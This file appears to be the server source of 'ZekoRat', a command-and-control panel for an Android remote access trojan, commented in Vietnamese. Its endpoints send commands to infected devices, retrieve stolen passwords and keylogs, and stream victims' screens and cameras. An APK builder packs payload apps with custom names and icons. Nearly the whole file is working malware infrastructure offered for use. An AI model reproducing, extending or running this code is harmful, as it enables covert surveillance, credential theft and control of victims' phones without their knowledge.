using System.Security.Cryptography;
using System.Text;
using System.Text.Json.Nodes;
using ZekoRat.Server;

var httpPort = int.TryParse(Environment.GetEnvironmentVariable("ZK_HTTP_PORT"), out var hp) ? hp : 8080;
var tcpPort = int.TryParse(Environment.GetEnvironmentVariable("ZK_TCP_PORT"), out var tp) ? tp : 7878;
var dbPath = Environment.GetEnvironmentVariable("ZK_DB") ?? "zekorat.db";
var adminUser = Environment.GetEnvironmentVariable("ZK_USER") ?? "admin";
var adminPass = Environment.GetEnvironmentVariable("ZK_PASS");
if (string.IsNullOrWhiteSpace(adminPass))
{
    adminPass = Convert.ToHexString(RandomNumberGenerator.GetBytes(6)).ToLowerInvariant();
    Console.WriteLine($"== mat khau dashboard duoc sinh: {adminPass} (dat ZK_PASS de tu chon) ==");
}
var allowPlain = (Environment.GetEnvironmentVariable("ZK_ALLOW_PLAINTEXT") ?? "1") != "0";
Hub.AllowPlaintext = allowPlain;
var pskRaw = Environment.GetEnvironmentVariable("ZK_PSK");
if (!string.IsNullOrWhiteSpace(pskRaw))
    Hub.Psk = SHA256.HashData(Encoding.UTF8.GetBytes(pskRaw));

Store.Init(dbPath);
var hub = new Hub(tcpPort);
Store.EnsureAdmin(adminUser, adminPass);

Console.WriteLine($"""
  ZekoRat C2
  dashboard : http://0.0.0.0:{httpPort}
  agent tcp : 0.0.0.0:{tcpPort}
  db        : {Path.GetFullPath(dbPath)}
  psk       : {(Hub.Psk is null ? "off" : "on")}
""");

var builder = WebApplication.CreateBuilder(args);
builder.Logging.SetMinimumLevel(LogLevel.Warning);
var app = builder.Build();
app.UseDefaultFiles();
app.UseStaticFiles();

AuthUser? Current(HttpContext ctx)
{
    if (!ctx.Request.Cookies.TryGetValue("zk_sess", out var tok) || string.IsNullOrEmpty(tok))
        return null;
    var u = Store.GetSessionUser(tok);
    if (u is null) return null;
    Store.TouchSession(tok);
    return u;
}

IResult Deny(string what = "unauthorized") =>
    Results.Json(new { error = what }, statusCode: 401);

IResult Forbid(string perm) =>
    Results.Json(new { error = "khong co quyen: " + perm }, statusCode: 403);

string ClientIp(HttpContext ctx) => ctx.Connection.RemoteIpAddress?.ToString() ?? "?";

bool Can(HttpContext ctx, string perm)
{
    var u = Current(ctx);
    return u is not null && u.Has(perm);
}

app.MapPost("/api/login", async (HttpContext ctx) =>
{
    JsonObject? body = null;
    try { body = await JsonNode.ParseAsync(ctx.Request.Body) as JsonObject; } catch { }
    var name = body?["user"]?.ToString() ?? "";
    var pass = body?["pass"]?.ToString() ?? "";
    var ip = ClientIp(ctx);
    var ua = ctx.Request.Headers.UserAgent.ToString();

    var row = Store.GetUser(name);
    if (row is null || row.Disabled || !Auth.Verify(pass, row.Salt, row.Hash))
    {
        Store.AddLog(name, ip, "login.fail", "sai user/pass");
        return Results.Json(new { error = "sai user hoac pass" }, statusCode: 401);
    }
    var token = Store.CreateSession(row.Id, row.Name, row.Role, ip, ua);
    Store.AddLog(row.Name, ip, "login.ok", "role=" + row.Role);
    ctx.Response.Cookies.Append("zk_sess", token, new CookieOptions
    {
        HttpOnly = true,
        SameSite = SameSiteMode.Lax,
        Expires = DateTimeOffset.UtcNow.AddHours(12)
    });
    return Results.Json(new { ok = true, role = row.Role });
});

app.MapPost("/api/logout", (HttpContext ctx) =>
{
    if (ctx.Request.Cookies.TryGetValue("zk_sess", out var t) && !string.IsNullOrEmpty(t))
    {
        var u = Store.GetSessionUser(t);
        Store.RevokeSession(t);
        if (u is not null) Store.AddLog(u.Name, ClientIp(ctx), "logout", "");
    }
    ctx.Response.Cookies.Delete("zk_sess");
    return Results.Json(new { ok = true });
});

app.MapGet("/api/me", (HttpContext ctx) =>
{
    var u = Current(ctx);
    if (u is null) return Deny();
    return Results.Json(new
    {
        ok = true,
        user = u.Name,
        role = u.Role,
        perms = u.Perms.ToArray()
    });
});
app.MapGet("/api/agents", (HttpContext ctx) =>
{
    if (!Can(ctx, "agent.view")) return Deny();
    var arr = Store.GetAgents();
    // refresh online flag from live sessions
    foreach (var n in arr)
    {
        if (n is JsonObject o)
            o["online"] = hub.Get(o["hwid"]!.ToString()) is not null ? 1 : 0;
    }
    return Results.Json(arr);
});

app.MapPost("/api/agents/{hwid}/cmd", async (string hwid, HttpContext ctx) =>
{
    if (!Can(ctx, "agent.cmd")) return Deny();
    var s = hub.Get(hwid);
    if (s is null) return Results.Json(new { error = "agent offline" }, statusCode: 404);
    try
    {
        JsonObject? body = null;
        try { body = await JsonNode.ParseAsync(ctx.Request.Body) as JsonObject; } catch { }
        var cmd = body?["cmd"]?.ToString() ?? "";
        var data = body?["data"] as JsonObject ?? new JsonObject();
        var timeout = TimeSpan.FromSeconds(body?["timeout"]?.GetValue<int>() ?? 20);
        Store.AddLog(Current(ctx)?.Name ?? "?", ClientIp(ctx), "cmd",
            cmd + " -> " + hwid[..Math.Min(8, hwid.Length)]);
        var resp = await s.CallAsync(cmd, data, timeout, ctx.RequestAborted);
        return Results.Json(resp);
    }
    catch (OperationCanceledException)
    {
        return Results.Json(new { error = "agent khong tra loi (timeout)" }, statusCode: 504);
    }
    catch (Exception ex)
    {
        Log.Warn("cmd error: " + ex);
        return Results.Json(new { error = ex.GetType().Name + ": " + ex.Message }, statusCode: 500);
    }
});

app.MapGet("/api/agents/{hwid}/passwords", (string hwid, HttpContext ctx) =>
    Can(ctx, "agent.data") ? Results.Json(Store.GetPasswords(hwid)) : Deny());

app.MapGet("/api/agents/{hwid}/events", (string hwid, HttpContext ctx) =>
{
    if (!Can(ctx, "agent.data")) return Deny();
    long since = long.TryParse(ctx.Request.Query["since"], out var s) ? s : 0;
    var (seq, items) = EvtHub.Since(hwid, since);
    return Results.Json(new { seq, items });
});
app.MapGet("/api/agents/{hwid}/keylog", (string hwid, HttpContext ctx) =>
    Can(ctx, "agent.data") ? Results.Json(new { text = Store.GetKeylog(hwid) }) : Deny());

// MJPEG stream: screen hoặc cam. Browser chỉ cần <img src>
// Ưu tiên frame do agent PUSH (evt "frame"); nếu agent cũ không push thì fallback poll lệnh.
app.MapGet("/api/agents/{hwid}/{kind}.mjpg", async (string hwid, string kind, HttpContext ctx) =>
{
    if (!Can(ctx, "agent.stream")) { ctx.Response.StatusCode = 401; return; }
    var s = hub.Get(hwid);
    if (s is null) { ctx.Response.StatusCode = 404; return; }

    var q = int.TryParse(ctx.Request.Query["q"], out var qq) ? Math.Clamp(qq, 20, 90) : (kind == "cam" ? 60 : 55);
    var fps = int.TryParse(ctx.Request.Query["fps"], out var ff) ? Math.Clamp(ff, 1, 30) : (kind == "cam" ? 12 : 8);
    var facing = int.TryParse(ctx.Request.Query["facing"], out var fc) ? fc : 0;

    ctx.Response.ContentType = "multipart/x-mixed-replace; boundary=zkframe";
    ctx.Response.Headers.CacheControl = "no-store";

    async Task WriteJpeg(byte[] jpg)
    {
        await ctx.Response.WriteAsync("--zkframe\r\nContent-Type: image/jpeg\r\nContent-Length: ", ctx.RequestAborted);
        await ctx.Response.WriteAsync(jpg.Length.ToString(), ctx.RequestAborted);
        await ctx.Response.WriteAsync("\r\n\r\n", ctx.RequestAborted);
        await ctx.Response.Body.WriteAsync(jpg, ctx.RequestAborted);
        await ctx.Response.WriteAsync("\r\n", ctx.RequestAborted);
        await ctx.Response.Body.FlushAsync(ctx.RequestAborted);
    }

    try
    {
        // tự bật stream nếu agent chưa đẩy frame
        if (!FrameHub.Streaming(hwid, kind))
        {
            _ = Task.Run(async () =>
            {
                try
                {
                    await s.CallAsync("stream_start", new JsonObject
                    {
                        ["kind"] = kind,
                        ["fps"] = fps,
                        ["quality"] = q,
                        ["facing"] = facing
                    }, TimeSpan.FromSeconds(10));
                }
                catch { }
            });
            // chờ frame đầu tối đa 2.5s
            for (int i = 0; i < 25 && !FrameHub.Streaming(hwid, kind); i++)
                await Task.Delay(100, ctx.RequestAborted);
        }

        if (FrameHub.Streaming(hwid, kind))
        {
            long lastSeq = -1;
            var interval = 1000 / fps;
            while (!ctx.RequestAborted.IsCancellationRequested)
            {
                var frame = FrameHub.Get(hwid, kind);
                if (frame is null) { await Task.Delay(150, ctx.RequestAborted); continue; }
                if (frame.Value.Seq == lastSeq) { await Task.Delay(15, ctx.RequestAborted); continue; }
                lastSeq = frame.Value.Seq;
                await WriteJpeg(frame.Value.Data);
                await Task.Delay(interval, ctx.RequestAborted);
            }
            return;
        }

        // fallback: agent cũ → hỏi từng frame
        var cmd = kind == "cam" ? "cam_shot" : "screenshot";
        while (!ctx.RequestAborted.IsCancellationRequested)
        {
            JsonObject resp;
            try
            {
                resp = await s.CallAsync(cmd, new JsonObject { ["quality"] = q }, TimeSpan.FromSeconds(8), ctx.RequestAborted);
            }
            catch { await Task.Delay(500, ctx.RequestAborted); continue; }

            var b64 = resp["jpeg"]?.ToString();
            if (string.IsNullOrEmpty(b64)) { await Task.Delay(400, ctx.RequestAborted); continue; }
            byte[] jpg;
            try { jpg = Convert.FromBase64String(b64); } catch { continue; }
            await WriteJpeg(jpg);
            await Task.Delay(1000 / Math.Max(1, fps), ctx.RequestAborted);
        }
    }
    catch (OperationCanceledException) { }
    catch (Exception ex) { Log.Warn("mjpeg: " + ex.Message); }
});

// ─── APK builder: dat ten file APK ───
static string SafeApkName(string? raw, string fallbackHost)
{
    var s = (raw ?? "").Trim();
    if (s.Length == 0) return $"ZekoDroid-{fallbackHost.Replace('.', '_')}.apk";
    var sb = new System.Text.StringBuilder();
    foreach (var ch in s)
    {
        if (char.IsLetterOrDigit(ch) || ch == '-' || ch == '_' || ch == '.') sb.Append(ch);
        else sb.Append('_');
    }
    var name = sb.ToString().Trim('.', '_');
    if (name.Length == 0) name = "ZekoDroid";
    if (name.Length > 64) name = name[..64];
    if (!name.EndsWith(".apk", StringComparison.OrdinalIgnoreCase)) name += ".apk";
    return name;
}
ApkBuilder.BaseApkPath = Environment.GetEnvironmentVariable("ZK_BASE_APK")
    ?? Path.Combine(AppContext.BaseDirectory, "builder", "zk_base.apk");
if (!File.Exists(ApkBuilder.BaseApkPath))
    ApkBuilder.BaseApkPath = Path.Combine("builder", "zk_base.apk");

app.MapGet("/api/builder/info", (HttpContext ctx) =>
{
    if (!Can(ctx, "builder.use")) return Deny();
    return Results.Json(new
    {
        ready = ApkBuilder.Ready(),
        basePath = ApkBuilder.BaseApkPath,
        serverIp = "0.0.0.0"
    });
});

app.MapPost("/api/builder/build", async (HttpContext ctx) =>
{
    if (!Can(ctx, "builder.use")) return Deny();
    JsonObject? body = null;
    try { body = await JsonNode.ParseAsync(ctx.Request.Body) as JsonObject; } catch { }
    var host = body?["host"]?.ToString() ?? "";
    var port = body?["port"]?.GetValue<int>() ?? 7878;
    var psk = body?["psk"]?.ToString() ?? "";
    var appName = body?["name"]?.ToString();
    var homeUrl = body?["home"]?.ToString();
    var fileName = body?["filename"]?.ToString();

    // cho phép gửi "url" đầy đủ (http://1.2.3.4:7878) thay vì host+port
    var urlRaw = body?["url"]?.ToString();
    if (!string.IsNullOrWhiteSpace(urlRaw))
    {
        var u = urlRaw.Trim();
        if (!u.Contains("://")) u = "http://" + u;
        if (Uri.TryCreate(u, UriKind.Absolute, out var parsed))
        {
            host = parsed.Host;
            if (parsed.Port > 0) port = parsed.Port;
        }
    }
    byte[]? icon = null;
    var iconB64 = body?["icon"]?.ToString();
    if (!string.IsNullOrEmpty(iconB64))
    {
        try { icon = Convert.FromBase64String(iconB64); } catch { }
    }
    if (string.IsNullOrWhiteSpace(host)) return Results.Json(new { error = "thieu host/url" }, statusCode: 400);

    var sw = System.Diagnostics.Stopwatch.StartNew();
    var res = ApkBuilder.Build(host.Trim(), port, psk, icon, appName, homeUrl);
    if (res.Apk is null) return Results.Json(new { error = res.Error }, statusCode: 400);
    Log.Ok($"builder: {host}:{port} name={appName ?? "-"} home={(string.IsNullOrWhiteSpace(homeUrl) ? "-" : homeUrl)} -> {res.Apk.Length / 1024} KB ({sw.ElapsedMilliseconds} ms)");
    var name = SafeApkName(fileName, host);
    return Results.File(res.Apk, "application/vnd.android.package-archive", name);
});
// ───────────── quản trị: users / sessions / logs ─────────────
app.MapGet("/api/roles", (HttpContext ctx) =>
{
    if (!Can(ctx, "users.manage")) return Deny();
    return Results.Json(new { roles = Auth.Roles, perms = Auth.AllPerms });
});

app.MapGet("/api/users", (HttpContext ctx) =>
{
    if (!Can(ctx, "users.manage")) return Deny();
    return Results.Json(Store.GetUsers());
});

app.MapPost("/api/users", async (HttpContext ctx) =>
{
    var u = Current(ctx);
    if (u is null || !u.Has("users.manage")) return Deny("users.manage");
    JsonObject? body = null;
    try { body = await JsonNode.ParseAsync(ctx.Request.Body) as JsonObject; } catch { }
    var name = body?["name"]?.ToString()?.Trim() ?? "";
    var pass = body?["pass"]?.ToString() ?? "";
    var role = body?["role"]?.ToString() ?? "viewer";
    if (name.Length < 2) return Results.Json(new { error = "ten qua ngan" }, statusCode: 400);
    if (pass.Length < 4) return Results.Json(new { error = "pass >= 4 ky tu" }, statusCode: 400);
    if (!Auth.Roles.Contains(role)) return Results.Json(new { error = "role khong hop le" }, statusCode: 400);
    if (!Store.CreateUser(name, pass, role, out var err))
        return Results.Json(new { error = err }, statusCode: 400);
    Store.AddLog(u.Name, ClientIp(ctx), "user.create", $"{name} role={role}");
    return Results.Json(new { ok = true });
});

app.MapDelete("/api/users/{id}", (string id, HttpContext ctx) =>
{
    var u = Current(ctx);
    if (u is null || !u.Has("users.manage")) return Deny("users.manage");
    var ok = Store.DeleteUser(long.TryParse(id, out var uid) ? uid : -1);
    if (ok) Store.AddLog(u.Name, ClientIp(ctx), "user.delete", "id=" + id);
    return Results.Json(new { ok });
});

app.MapGet("/api/sessions", (HttpContext ctx) =>
{
    if (!Can(ctx, "sessions.manage")) return Deny();
    return Results.Json(Store.GetSessions());
});

app.MapPost("/api/sessions/revoke", async (HttpContext ctx) =>
{
    var u = Current(ctx);
    if (u is null || !u.Has("sessions.manage")) return Deny("sessions.manage");
    JsonObject? body = null;
    try { body = await JsonNode.ParseAsync(ctx.Request.Body) as JsonObject; } catch { }
    var tok = body?["token"]?.ToString() ?? "";
    if (tok.Length < 10) return Results.Json(new { error = "token khong hop le" }, statusCode: 400);
    Store.RevokeSession(tok);
    Store.AddLog(u.Name, ClientIp(ctx), "session.revoke", tok[..12]);
    return Results.Json(new { ok = true });
});

app.MapGet("/api/logs", (HttpContext ctx) =>
{
    if (!Can(ctx, "logs.view")) return Deny();
    var limit = int.TryParse(ctx.Request.Query["limit"], out var l) ? Math.Clamp(l, 10, 1000) : 300;
    return Results.Json(Store.GetLogs(limit));
});
_ = Task.Run(() => hub.RunAsync(app.Lifetime.ApplicationStopping));

app.Run($"http://0.0.0.0:{httpPort}");
